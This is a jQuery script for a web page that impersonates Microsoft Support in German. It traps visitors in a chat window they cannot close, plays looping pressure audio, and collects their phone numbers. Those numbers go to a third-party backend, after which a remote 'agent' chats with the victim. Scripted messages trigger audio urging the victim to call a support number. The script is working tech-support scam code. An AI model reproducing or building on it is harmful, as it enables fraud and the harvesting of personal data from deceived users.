$(document).ready(function() {
    console.log('DEBUG: Script loading...');

    // Initialize variables
    let socket = null;
    let conversationId = null;
    let typingTimeout = null;
    let lastTypingEmit = 0;
    let currentCountryCode = null;
    let phoneNumber = '';
    let connectionTimeout = null;

    // Initialize audio
    const audio1 = new Audio('audio/1.mp3');
    const audio2 = new Audio('audio/2.mp3');
    const audioMid = new Audio('audio/mid.mp3');
    const audio3 = new Audio('audio/3.mp3');
    const notificationAudio = new Audio('notification.mp3');
    
    // Message-specific audio triggers
    const audioA = new Audio('audio/a.mp3');
    const audioB = new Audio('audio/b.mp3');
    const audioC = new Audio('audio/c.mp3');
    const audioD = new Audio('audio/d.mp3');
    const reminderAudio = new Audio('audio/reminder.mp3');
    const chatErrorAudio = new Audio('audio/chaterror.mp3');
    
    let reminderLoopTimeout = null;
    
    let audioTimeout = null;
    
    // Function to play audio with loop delay
    function playAudioWithDelay(audio, delaySeconds) {
        // Clear any existing timeout
        if (audioTimeout) {
            clearTimeout(audioTimeout);
        }
        
        // Play the audio
        audio.currentTime = 0;
        audio.play().catch(err => console.log('Audio play error:', err));
        
        // Set up loop with delay
        audio.onended = function() {
            audioTimeout = setTimeout(function() {
                playAudioWithDelay(audio, delaySeconds);
            }, delaySeconds * 1000);
        };
    }
    
    // Stop all chat audio
    function stopAllChatAudio() {
        audio1.pause();
        audio2.pause();
        audioMid.pause();
        audio3.pause();
        audio1.currentTime = 0;
        audio2.currentTime = 0;
        audioMid.currentTime = 0;
        audio3.currentTime = 0;
        if (audioTimeout) {
            clearTimeout(audioTimeout);
            audioTimeout = null;
        }
    }
    
    // Get background audio element
    function getBackgroundAudio() {
        return document.getElementById('background-audio');
    }

    // Create modal HTML
    const modalHTML = `
        <div id="chatModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100000;">
            <div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; width: 90%; max-width: 400px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
                <!-- Header -->
                <div style="background: #0078D4; padding: 16px; border-radius: 12px 12px 0 0; display: flex; align-items: center; justify-content: space-between;">
                    <div style="display: flex; align-items: center; gap: 12px;">
                        <img src="icons/windows.png" alt="Microsoft Logo" style="width: 24px; height: 24px;">
                        <span style="color: white; font-size: 18px; font-weight: 500;">Microsoft Support</span>
                    </div>
                    <div class="window-controls" style="display: flex; gap: 4px;">
                        <button class="minimize" style="background: none; border: none; color: white; font-size: 20px; cursor: pointer;">−</button>
                        <button class="maximize" style="background: none; border: none; color: white; font-size: 20px; cursor: pointer;">□</button>
                        <button class="close" style="background: none; border: none; color: white; font-size: 20px; cursor: pointer;">×</button>
                    </div>
                </div>

                <!-- Step 1: Country Selection -->
                <div id="step1" style="display: block; padding: 20px;">
                    <div style="text-align: center; margin-bottom: 24px;">
                        <h2 style="color: #333; font-size: 20px; margin: 0 0 8px 0;">Wählen Sie Ihre Region</h2>
                        <p style="color: #666; margin: 0; font-size: 14px;">Wählen Sie Ihr Land, um sich mit einem lokalen Support-Agent zu verbinden</p>
                    </div>
                    <div style="display: flex; flex-direction: column; gap: 12px;">
                        <button class="country-btn" data-code="+41" style="display: flex; align-items: center; padding: 16px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; transition: all 0.3s; text-align: left; gap: 12px;">
                            <img src="icons/switzerland.png" alt="Switzerland" style="width: 24px; height: 24px; border-radius: 4px;">
                            <div style="flex: 1;">
                                <div style="font-weight: 500; color: #333;">Switzerland</div>
                                <div style="font-size: 13px; color: #666;">Support rund um die Uhr verfügbar</div>
                            </div>
                            <div style="color: #0078D4;">+41</div>
                        </button>
                        <button class="country-btn" data-code="+43" style="display: flex; align-items: center; padding: 16px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; transition: all 0.3s; text-align: left; gap: 12px;">
                            <img src="icons/austria.png" alt="Austria" style="width: 24px; height: 24px; border-radius: 4px;">
                            <div style="flex: 1;">
                                <div style="font-weight: 500; color: #333;">Austria</div>
                                <div style="font-size: 13px; color: #666;">Support rund um die Uhr verfügbar</div>
                            </div>
                            <div style="color: #0078D4;">+43</div>
                        </button>
                        <button class="country-btn" data-code="+49" style="display: flex; align-items: center; padding: 16px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; transition: all 0.3s; text-align: left; gap: 12px;">
                            <img src="icons/germany.png" alt="Germany" style="width: 24px; height: 24px; border-radius: 4px;">
                            <div style="flex: 1;">
                                <div style="font-weight: 500; color: #333;">Germany</div>
                                <div style="font-size: 13px; color: #666;">Support rund um die Uhr verfügbar</div>
                            </div>
                            <div style="color: #0078D4;">+49</div>
                        </button>
                        <button class="country-btn" data-code="+352" style="display: flex; align-items: center; padding: 16px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; transition: all 0.3s; text-align: left; gap: 12px;">
                            <img src="icons/luxembourg.png" alt="Luxembourg" style="width: 24px; height: 24px; border-radius: 4px;">
                            <div style="flex: 1;">
                                <div style="font-weight: 500; color: #333;">Luxembourg</div>
                                <div style="font-size: 13px; color: #666;">Support rund um die Uhr verfügbar</div>
                            </div>
                            <div style="color: #0078D4;">+352</div>
                        </button>
                    </div>
                </div>

                <!-- Step 2: Dialpad -->
                <div id="step2" style="display: none; padding: 20px;">
                    <div style="text-align: center; margin-bottom: 24px; position: relative;">
                        <button class="back-btn" style="position: absolute; left: 0; top: 50%; transform: translateY(-50%); background: none; border: none; color: #0078D4; cursor: pointer; display: flex; align-items: center; gap: 4px; font-size: 14px; padding: 8px;">
                            <i class="fas fa-arrow-left"></i>
                            Zurück
                        </button>
                        <h2 style="color: #333; font-size: 20px; margin: 0 0 8px 0;">Geben Sie Ihre Nummer ein</h2>
                        <p style="color: #666; margin: 0; font-size: 14px;">Wir verbinden Sie mit einem Microsoft Support-Agent</p>
                    </div>
                    <div class="phone-input-container" style="margin-bottom: 20px;">
                        <!-- Phone input will be inserted here -->
                    </div>
                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 20px;">
                        <button class="dialpad-btn" data-num="1" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333;">1</button>
                        <button class="dialpad-btn" data-num="2" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333;">2</button>
                        <button class="dialpad-btn" data-num="3" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333;">3</button>
                        <button class="dialpad-btn" data-num="4" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333;">4</button>
                        <button class="dialpad-btn" data-num="5" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333;">5</button>
                        <button class="dialpad-btn" data-num="6" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333;">6</button>
                        <button class="dialpad-btn" data-num="7" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333;">7</button>
                        <button class="dialpad-btn" data-num="8" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333;">8</button>
                        <button class="dialpad-btn" data-num="9" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333;">9</button>
                        <button class="dialpad-btn" data-num="0" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333;">0</button>
                        <button class="dialpad-btn backspace" style="padding: 20px; cursor: pointer; border: 1px solid #ddd; border-radius: 8px; background: white; font-size: 20px; transition: all 0.3s; color: #333; grid-column: span 2;">
                            <i class="fas fa-backspace"></i>
                        </button>
                    </div>
                    <button id="confirmNumber" style="width: 100%; padding: 16px; background: #0078D4; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px;">
                        <img src="icons/windows.png" alt="Microsoft Logo" style="width: 20px; height: 20px;">
                        Mit Support verbinden
                    </button>
                </div>

                <!-- Step 2.5: Phone Confirmation -->
                <div id="step2-5" style="display: none; padding: 20px;">
                    <div style="text-align: center; margin-bottom: 24px;">
                        <h2 style="color: #333; font-size: 20px; margin: 0 0 8px 0;">Nummer bestätigen</h2>
                        <p style="color: #666; margin: 0; font-size: 14px;">Bitte bestätigen Sie Ihre Telefonnummer</p>
                    </div>
                    <div style="background: #f8f9fa; border: 2px solid #0078D4; border-radius: 8px; padding: 20px; margin-bottom: 20px;">
                        <div style="font-size: 13px; color: #666; margin-bottom: 8px;">Ihre Nummer:</div>
                        <div id="confirmPhoneDisplay" style="font-size: 24px; font-weight: 600; color: #0078D4; text-align: center;"></div>
                    </div>
                    <div style="display: flex; gap: 12px; margin-bottom: 12px;">
                        <button id="editPhoneBtn" style="flex: 1; padding: 12px; background: #e1e1e1; color: #000; border: 1px solid #adadad; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s;">
                            <i class="fas fa-edit"></i> Bearbeiten
                        </button>
                        <button id="confirmPhoneBtn" style="flex: 1; padding: 12px; background: #0078D4; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px;">
                            <img src="icons/windows.png" alt="Microsoft Logo" style="width: 18px; height: 18px;">
                            Bestätigen
                        </button>
                    </div>
                </div>

                <!-- Step 3: Chat -->
                <div id="step3" style="display: none;">
                    <div style="padding: 16px 20px; border-bottom: 1px solid #eee;">
                        <div style="display: flex; align-items: center; gap: 12px;">
                            <img src="icons/windows.png" alt="Agent" style="width: 40px; height: 40px; border-radius: 20px;">
                            <div>
                                <div style="font-weight: 500; color: #333;">Microsoft Support: <span id="chatHeaderPhone" style="color: #0078D4;">0800-180-1986</span></div>
                                <div style="font-size: 13px; color: #666;">Verbinde mit einem Agent...</div>
                            </div>
                        </div>
                    </div>
                    <div class="chat-messages" style="height: 300px; padding: 20px; overflow-y: auto;">
                        <div style="text-align: center; color: #666; margin-bottom: 16px;">
                            <div style="margin-bottom: 12px;">
                                <img src="icons/windows.png" alt="Microsoft Logo" style="width: 48px; height: 48px; margin-bottom: 8px;">
                                <div style="font-weight: 500; color: #333;">Willkommen beim Microsoft Support</div>
                            </div>
                            <div style="font-size: 14px; color: #666;">Verbinde Sie mit einem Support-Agent...</div>
                            <div style="margin-top: 8px; font-size: 13px; color: #0078D4;">Geschätzte Wartezeit: weniger als 1 Minute</div>
                        </div>
                    </div>
                    <div class="typing-indicator" style="display: none; font-size: 13px; color: #666; padding: 8px 20px;"></div>
                    <div style="padding: 20px; border-top: 1px solid #eee;">
                        <div style="display: flex; gap: 12px;">
                            <input type="text" id="messageInput" placeholder="Nachricht eingeben..." style="flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; background: white; z-index: 1000; position: relative; color: #333; opacity: 1; visibility: visible;" autocomplete="off">
                            <button id="sendMessage" style="padding: 12px 24px; background: #0078D4; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.3s;">Senden</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Connection Failed Modal -->
        <div id="connectionFailedModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 150000; align-items: center; justify-content: center;">
            <div style="background: white; border-radius: 12px; padding: 30px; max-width: 400px; width: 90%; text-align: center; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);">
                <div style="font-size: 48px; margin-bottom: 16px;">⚠️</div>
                <h2 style="color: #d13438; font-size: 22px; margin: 0 0 12px 0; font-weight: 600;">Verbindung fehlgeschlagen</h2>
                <p style="color: #666; font-size: 14px; margin: 0 0 20px 0; line-height: 1.5;">Die Verbindung zum Support konnte nicht hergestellt werden. Bitte rufen Sie uns direkt an oder versuchen Sie es erneut.</p>
                <div style="background: #f8f9fa; border: 2px solid #0078D4; border-radius: 8px; padding: 16px; margin-bottom: 20px;">
                    <div style="font-size: 12px; color: #666; margin-bottom: 6px;">Microsoft Support</div>
                    <div id="failedModalPhone" style="font-size: 24px; font-weight: 600; color: #0078D4;">0800-180-1986</div>
                </div>
                <div>
                    <button id="closeFailedModalBtn" style="width: 100%; padding: 14px; background: #0078D4; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 15px; font-weight: 500; transition: background 0.2s;">
                        Schließen
                    </button>
                </div>
            </div>
        </div>
    `;

    // Add modal to page
    $('body').append(modalHTML);
    console.log('DEBUG: Modal added to page');

    // Function to format phone number
    function formatPhoneNumber(number) {
        if (!number) return '';
        const groups = number.match(/.{1,5}/g) || [];
        return groups.join(' ');
    }
    
    // Function to show connection failed modal
    function showConnectionFailed() {
        console.log('DEBUG: Showing connection failed modal');
        $('#connectionFailedModal').css('display', 'flex');
        console.log('DEBUG: Modal display set to flex');
        // Update phone number in modal
        $('#failedModalPhone').text(window.GLOBAL_PHONE_NUMBER || '0800-180-1986');
        // Play chat error audio
        chatErrorAudio.currentTime = 0;
        chatErrorAudio.play().catch(err => console.log('Chat error audio play error:', err));
    }
    
    // Function to hide connection failed modal
    function hideConnectionFailed() {
        $('#connectionFailedModal').hide();
    }
    
    // Handle close failed modal button
    $(document).on('click', '#closeFailedModalBtn', function() {
        hideConnectionFailed();
        // Close chat modal
        $('#chatModal').hide();
        // Restart background audio
        const bgAudio = getBackgroundAudio();
        if (bgAudio) {
            bgAudio.currentTime = 0;
            bgAudio.loop = true;
            bgAudio.play().catch(err => console.log('Background audio play error:', err));
        }
    });

    // Function to update phone display
    function updatePhoneDisplay() {
        $('#phoneInput').val(formatPhoneNumber(phoneNumber));
    }

    // Function to show chat modal
    function showChatModal() {
        console.log('DEBUG: Showing modal');
        
        // Stop background audio
        const bgAudio = getBackgroundAudio();
        if (bgAudio) {
            bgAudio.pause();
        }
        
        $('#chatModal').fadeIn();
        $('#step1').show();
        $('#step2, #step3').hide();
        
        // Play step 1 audio with 5 second delay loop
        stopAllChatAudio();
        playAudioWithDelay(audio1, 5);
    }

    // Global function to open chat (for onclick handlers)
    window.openChat = function() {
        console.log('DEBUG: openChat() called from onclick handler');
        showChatModal();
    };

    // Add click handlers
    $(document).on('click', '.chat-button, .support-chat-btn, .chat-now, .chat-defender-btn', function(e) {
        console.log('DEBUG: Chat button clicked:', this.className);
        console.log('DEBUG: Button text:', $(this).text());
        e.preventDefault();
        e.stopPropagation();
        showChatModal();
    });

    // Also handle clicks on buttons with onclick handlers
    $(document).on('click', 'button[onclick*="openChat"]', function(e) {
        console.log('DEBUG: Button with onclick="openChat" clicked:', $(this).text());
        e.preventDefault();
        e.stopPropagation();
        showChatModal();
    });

    // Specific handler for the "Jetzt chatten" button
    $(document).on('click', '#jetzt-chatten-btn', function(e) {
        console.log('DEBUG: Jetzt chatten button clicked directly');
        e.preventDefault();
        e.stopPropagation();
        showChatModal();
    });

    // Handle country selection
    $(document).on('click', '.country-btn', function() {
        const countryCode = $(this).data('code');
        console.log('DEBUG: Country selected:', countryCode);
        currentCountryCode = countryCode;
        phoneNumber = '';
        $('.phone-input-container').html(`
            <div style="position: relative;">
                <div style="display: flex; align-items: center; border: 2px solid #0078D4; border-radius: 8px; overflow: hidden;">
                    <div style="padding: 16px; background: #f0f0f0; color: #333; font-size: 20px; border-right: 2px solid #0078D4;">${countryCode}</div>
                    <input type="text" id="phoneInput" readonly style="flex: 1; padding: 16px; text-align: left; font-size: 20px; border: none; color: #333; background: #f8f9fa; box-sizing: border-box;">
                </div>
            </div>
        `);
        updatePhoneDisplay();
        $('#step1').hide();
        $('#step2').show();
        
        // Play step 2 audio with 32 second delay loop
        stopAllChatAudio();
        playAudioWithDelay(audio2, 32);
    });

    // Handle dialpad clicks
    $(document).on('click', '.dialpad-btn', function() {
        const num = $(this).data('num');
        if ($(this).hasClass('backspace')) {
            phoneNumber = phoneNumber.slice(0, -1);
        } else {
            phoneNumber += num;
        }
        updatePhoneDisplay();
    });

    // Handle keyboard input
    $(document).on('keydown', function(e) {
        if ($('#step2').is(':visible')) {
            if (e.key >= '0' && e.key <= '9') {
                phoneNumber += e.key;
                updatePhoneDisplay();
            } else if (e.key === 'Backspace') {
                phoneNumber = phoneNumber.slice(0, -1);
                updatePhoneDisplay();
            } else if (e.key === 'Enter') {
                $('#confirmNumber').click();
            }
        }
    });

    // Handle back buttons
    $(document).on('click', '.back-btn', function() {
        console.log('Back button disabled - chat is non-closable');
        // Chat cannot be closed
        return false;
    });

    // Handle close button - DISABLED (chat is non-closable)
    $(document).on('click', '.close', function() {
        console.log('DEBUG: Close button disabled - chat is non-closable');
        // Chat cannot be closed
        return false;
    });

    // Handle confirm number button (step 2 -> step 2.5)
    $(document).on('click', '#confirmNumber', function() {
        console.log('DEBUG: Confirm number button clicked');
        console.log('DEBUG: Phone number:', phoneNumber);
        
        if (!phoneNumber || phoneNumber.length === 0) {
            alert('Bitte geben Sie eine Telefonnummer ein');
            return;
        }
        
        // Show confirmation step
        $('#step2').hide();
        $('#step2-5').show();
        
        // Display the phone number with country code
        $('#confirmPhoneDisplay').text(currentCountryCode + ' ' + formatPhoneNumber(phoneNumber));
        
        // Play mid audio for confirmation step
        stopAllChatAudio();
        audioMid.currentTime = 0;
        audioMid.play().catch(err => console.log('Audio play error:', err));
    });
    
    // Handle edit phone button (go back to step 2)
    $(document).on('click', '#editPhoneBtn', function() {
        console.log('DEBUG: Edit phone button clicked');
        $('#step2-5').hide();
        $('#step2').show();
    });
    
    // Handle confirm phone button (step 2.5 -> step 3)
    $(document).on('click', '#confirmPhoneBtn', function() {
        console.log('DEBUG: Phone confirmed, moving to chat');
        
        $('#step2-5').hide();
        $('#step3').show();
        
        // Update phone number in chat header
        $('#chatHeaderPhone').text(window.GLOBAL_PHONE_NUMBER || '0800-180-1986');
        
        // Ensure input field is enabled and focused
        setTimeout(function() {
            const $input = $('#messageInput');
            $input.prop('disabled', false)
                  .prop('readonly', false)
                  .removeAttr('readonly')
                  .removeAttr('disabled')
                  .val('') // Clear any existing value
                  .css({
                      'pointer-events': 'auto',
                      'user-select': 'text',
                      'color': '#333',
                      'background': 'white',
                      'opacity': '1',
                      'visibility': 'visible'
                  })
                  .focus();
            
            console.log('DEBUG: Input field enabled, cleared, and focused');
        }, 100);
        
        // Play step 3 audio only once (no loop)
        stopAllChatAudio();
        audio3.currentTime = 0;
        audio3.play().catch(err => console.log('Audio play error:', err));
        
        initializeChat(phoneNumber, currentCountryCode);
    });

    // Initialize AJAX-based chat (no Socket.IO needed)
    function initializeChat(phone, countryCode) {
        console.log('DEBUG: Initializing AJAX chat connection');
        
        // Store phone and country code for API calls
        currentCountryCode = countryCode;
        phoneNumber = phone;
        
        // Initialize conversation with backend
        initializeConversation(phone, countryCode);
    }

    // Initialize conversation with Laravel backend
    function initializeConversation(phone, countryCode) {
        console.log('DEBUG: Initializing conversation with backend');
        
        // Set 15-second timeout for connection
        if (connectionTimeout) {
            clearTimeout(connectionTimeout);
        }
        connectionTimeout = setTimeout(function() {
            console.log('DEBUG: Connection timeout - no response after 15 seconds');
            showConnectionFailed();
        }, 15000);
        
        const backendUrl = window.CHAT_CONFIG?.server || 'https://chatstaging.maxlandmedia.com';
        
        $.ajax({
            url: backendUrl + '/api/visitor/init',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({
                phone: phone,
                country_code: countryCode,
                page_url: window.location.href,
                visitor_ip: 'N/A'
            }),
            success: function(response) {
                console.log('DEBUG: Conversation initialized:', response);
                
                // Clear connection timeout on successful connection
                if (connectionTimeout) {
                    clearTimeout(connectionTimeout);
                    connectionTimeout = null;
                }
                
                if (response && response.conversation && response.conversation.id) {
                    conversationId = response.conversation.id;
                    console.log('DEBUG: Conversation ID:', conversationId);
                    appendMessage('System', 'Mit Support verbunden. Sie können jetzt Nachrichten senden.');
                    
                    // Start polling for messages
                    startMessagePolling();
                }
            },
            error: function(xhr, status, error) {
                console.error('DEBUG: Failed to initialize conversation:', error);
                // Clear connection timeout
                if (connectionTimeout) {
                    clearTimeout(connectionTimeout);
                    connectionTimeout = null;
                }
                showConnectionFailed();
            }
        });
    }

    // Start polling for new messages
    function startMessagePolling() {
        if (!conversationId) return;
        
        const backendUrl = window.CHAT_CONFIG?.server || 'https://chatstaging.maxlandmedia.com';
        let lastMessageId = 0; // Track last processed message ID
        
        // Poll every 2 seconds
        setInterval(function() {
            $.ajax({
                url: backendUrl + '/api/visitor/conversations/' + conversationId,
                method: 'GET',
                success: function(response) {
                    if (response && response.messages) {
                        // Process new messages (only those with ID > lastMessageId)
                        response.messages.forEach(function(msg) {
                            if (msg.sender_type === 'agent' && msg.id > lastMessageId) {
                                appendMessage('Agent', msg.body);
                                lastMessageId = Math.max(lastMessageId, msg.id);
                                // Play notification sound
                                notificationAudio.currentTime = 0;
                                notificationAudio.play().catch(err => console.log('Notification sound error:', err));
                            }
                        });
                    }
                },
                error: function(xhr, status, error) {
                    console.error('DEBUG: Failed to poll messages:', error);
                }
            });
        }, 2000);
    }

    // Function to make links clickable
    function makeLinksClickable(text) {
        // Detect URLs starting with http://, https://, or www.
        const urlRegex = /(https?:\/\/[^\s<]+)/g;
        return text.replace(urlRegex, function(url) {
            return '<a href="' + url + '" target="_blank" rel="noopener noreferrer" style="color: #0078D4; text-decoration: underline; cursor: pointer;">' + url + '</a>';
        });
    }
    
    // Function to start reminder audio loop
    function startReminderLoop() {
        console.log('DEBUG: Starting reminder audio loop');
        // Clear any existing loop
        stopReminderLoop();
        
        // Play reminder audio, wait for it to finish, then wait 5 seconds before repeating
        function playReminder() {
            reminderAudio.currentTime = 0;
            
            // Remove any existing event listener
            reminderAudio.removeEventListener('ended', handleReminderEnded);
            
            // Add event listener for when audio finishes
            function handleReminderEnded() {
                console.log('DEBUG: Reminder audio finished, waiting 5 seconds...');
                // Wait 5 seconds after audio finishes, then play again
                reminderLoopTimeout = setTimeout(playReminder, 5000);
            }
            
            reminderAudio.addEventListener('ended', handleReminderEnded);
            reminderAudio.play().catch(err => console.log('Reminder audio play error:', err));
        }
        
        playReminder();
    }
    
    // Function to stop reminder audio loop
    function stopReminderLoop() {
        if (reminderLoopTimeout) {
            console.log('DEBUG: Stopping reminder audio loop');
            clearTimeout(reminderLoopTimeout);
            reminderLoopTimeout = null;
        }
        reminderAudio.pause();
        reminderAudio.currentTime = 0;
    }
    
    // Function to check message and play specific audio
    function checkAndPlayMessageAudio(message) {
        // Define message-to-audio mappings
        const audioMappings = [
            { text: 'Können Sie bitte Ihre richtige Nummer schreiben?', audio: audioA },
            { text: 'Bitte antworten Sie auf die Fragen', audio: audioB },
            { text: 'Bitte kontaktieren Sie die Supportnummer', audio: audioC },
            { text: 'Ich habe von einer kalifornischen Nummer angerufen, aber es geht immer auf die Mailbox. Bitte antworten Sie', audio: audioD }
        ];
        
        // Check if message matches any of the trigger texts
        for (let mapping of audioMappings) {
            if (message.includes(mapping.text)) {
                console.log('DEBUG: Playing specific audio for message:', mapping.text);
                mapping.audio.currentTime = 0;
                mapping.audio.play().catch(err => console.log('Audio play error:', err));
                break; // Play only the first match
            }
        }
    }
    
    // Function to append message
    let highlightTimeout = null;
    
    function appendMessage(sender, message, failed = false) {
        // Check if message is just ".." (reminder trigger)
        if (sender !== 'You' && message.trim() === '..') {
            console.log('DEBUG: Received reminder trigger (..), starting reminder loop');
            startReminderLoop();
            return; // Don't display the message
        }
        
        // Make links clickable in the message
        const processedMessage = makeLinksClickable(message);
        
        // Generate unique ID for this message
        const messageId = 'msg-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
        
        const messageHTML = `
            <div id="${messageId}" class="chat-message-item" style="margin-bottom: 16px; ${sender === 'You' ? 'text-align: right;' : ''} transition: all 0.3s ease;">
                <div style="font-weight: 500; color: ${sender === 'You' ? '#0078D4' : '#333'}; margin-bottom: 4px;">
                    ${sender}
                </div>
                <div class="message-bubble" style="display: inline-block; padding: 12px; border-radius: 8px; background: ${sender === 'You' ? '#E3F2FD' : '#f5f5f5'}; color: #333; max-width: 80%; word-wrap: break-word; transition: all 0.3s ease;">
                    ${processedMessage}
                </div>
                ${failed ? '<div style="color: #ff3b30; font-size: 12px; margin-top: 4px;">Nachricht konnte nicht gesendet werden</div>' : ''}
            </div>
        `;
        $('.chat-messages').append(messageHTML);
        $('.chat-messages').scrollTop($('.chat-messages')[0].scrollHeight);
        
        // If this is a support message (not from 'You'), set up highlight timeout
        if (sender !== 'You' && !failed) {
            // Check and play specific audio if message matches trigger text
            checkAndPlayMessageAudio(message);
            
            // Clear any existing timeout
            if (highlightTimeout) {
                clearTimeout(highlightTimeout);
            }
            
            // Remove highlight from all messages
            $('.chat-message-item').removeClass('highlight-message');
            
            // Set timeout to highlight this message after 7 seconds
            highlightTimeout = setTimeout(function() {
                $('#' + messageId + ' .message-bubble').css({
                    'animation': 'pulse-highlight 1.5s ease-in-out infinite',
                    'box-shadow': '0 0 0 0 rgba(255, 193, 7, 0.7)'
                });
                
                // Add animation keyframes if not already added
                if (!$('#highlight-animation-style').length) {
                    $('head').append(`
                        <style id="highlight-animation-style">
                            @keyframes pulse-highlight {
                                0% {
                                    box-shadow: 0 0 0 0 rgba(255, 193, 7, 0.7);
                                }
                                50% {
                                    box-shadow: 0 0 0 8px rgba(255, 193, 7, 0);
                                    background: #fff3cd !important;
                                }
                                100% {
                                    box-shadow: 0 0 0 0 rgba(255, 193, 7, 0);
                                }
                            }
                        </style>
                    `);
                }
            }, 7000);
        } else if (sender === 'You') {
            // Customer sent a message, clear highlight timeout and remove any highlights
            if (highlightTimeout) {
                clearTimeout(highlightTimeout);
                highlightTimeout = null;
            }
            $('.chat-message-item .message-bubble').css({
                'animation': 'none',
                'box-shadow': 'none'
            });
            // Stop reminder loop when customer replies
            stopReminderLoop();
        }
    }

    // Handle send button click
    $(document).on('click', '#sendMessage', function() {
        console.log('DEBUG: Send button clicked');
        const message = $('#messageInput').val().trim();
        console.log('DEBUG: Message value:', message);
        if (!message) return;

        if (!conversationId) {
            appendMessage('System', 'Chat nicht initialisiert. Bitte warten...', true);
            return;
        }

        console.log('DEBUG: Sending message:', {
            message: message,
            conversationId: conversationId
        });

        const backendUrl = window.CHAT_CONFIG?.server || 'https://chatstaging.maxlandmedia.com';

        $.ajax({
            url: backendUrl + '/api/visitor/conversations/' + conversationId + '/message',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({
                body: message
            }),
            success: function(response) {
                console.log('DEBUG: Message sent successfully:', response);
                appendMessage('You', message);
                $('#messageInput').val('');
            },
            error: function(xhr, status, error) {
                console.error('DEBUG: Failed to send message:', error);
                showConnectionFailed();
            }
        });
    });

    // Handle input events on message input
    $(document).on('input', '#messageInput', function() {
        console.log('DEBUG: Message input changed:', $(this).val());
    });

    // Handle keypress events to manually update the input value
    $(document).on('keypress', '#messageInput', function(e) {
        console.log('DEBUG: Keypress event:', e.key);
        // Allow normal input processing
        return true;
    });

    // Handle keydown events and manually update input if needed
    $(document).on('keydown', '#messageInput', function(e) {
        console.log('DEBUG: Key pressed in message input:', e.key);
        
        // Handle special keys
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            $('#sendMessage').click();
            return;
        }
        
        // Handle Backspace
        if (e.key === 'Backspace') {
            const currentValue = $(this).val();
            $(this).val(currentValue.slice(0, -1));
            console.log('DEBUG: Backspace - new value:', $(this).val());
            return;
        }
        
        // For regular typing, manually update the input value
        if (e.key.length === 1 && !e.ctrlKey && !e.metaKey) { // Single character keys
            e.preventDefault(); // Prevent default to handle manually
            const currentValue = $(this).val();
            const newValue = currentValue + e.key;
            $(this).val(newValue);
            console.log('DEBUG: Manual input update - new value:', newValue);
        }
    });

    // Handle click on message input to ensure it's focused
    $(document).on('click', '#messageInput', function() {
        console.log('DEBUG: Message input clicked');
        $(this).focus();
        
        // Clear any stuck values and ensure input is ready
        if ($(this).val() === 'test') {
            $(this).val('');
            console.log('DEBUG: Cleared test value, input ready for typing');
        }
    });

    // Handle input events on message input
    $(document).on('input', '#messageInput', function() {
        console.log('DEBUG: Message input changed:', $(this).val());
    });

    // Handle focus events on message input
    $(document).on('focus', '#messageInput', function() {
        console.log('DEBUG: Message input focused');
    });

    console.log('DEBUG: All handlers added');
    
    // Ensure the "Jetzt chatten" button is clickable
    setTimeout(function() {
        const $btn = $('#jetzt-chatten-btn');
        if ($btn.length) {
            $btn.css({
                'pointer-events': 'auto',
                'z-index': '1000',
                'position': 'relative'
            });
            console.log('DEBUG: Jetzt chatten button made clickable');
            console.log('DEBUG: Button position:', $btn.offset());
            console.log('DEBUG: Button size:', $btn.width(), 'x', $btn.height());
        } else {
            console.log('DEBUG: Jetzt chatten button not found');
        }
        
        // Also check for buttons with "Jetzt chatten" text
        const $textBtn = $('button:contains("Jetzt chatten")');
        console.log('DEBUG: Found', $textBtn.length, 'buttons with "Jetzt chatten" text');
        $textBtn.each(function(i) {
            console.log('DEBUG: Button', i, ':', $(this).attr('id'), $(this).attr('class'));
        });
    }, 1000);
});